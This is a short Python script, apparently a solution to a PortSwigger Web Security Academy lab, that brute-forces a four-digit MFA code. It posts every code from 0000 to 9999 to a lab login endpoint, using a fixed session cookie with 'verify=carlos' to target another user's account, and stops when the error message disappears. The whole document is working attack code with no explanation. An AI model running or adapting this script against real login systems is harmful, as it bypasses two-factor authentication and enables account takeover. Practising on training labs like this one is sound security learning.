
import requests


#for i in range(0,9999+1):
#	print(str(i).zfill(4))

url = "https://ac741f501f1677c8c0e08090005600e2.web-security-academy.net/login2"


for i in range(0,9999+1):

	headers = {
		"Cookie":"session=3s9OE88hHEzxU7dNAjr6kjsKYbLV2OA1; verify=carlos"
	}

	data = {
		"mfa-code":"{}".format(str(i).zfill(4))
	}

	r = requests.post(url,headers=headers,data=data)

	if "Incorrect security code" not in r.text:
		print(i)
		break
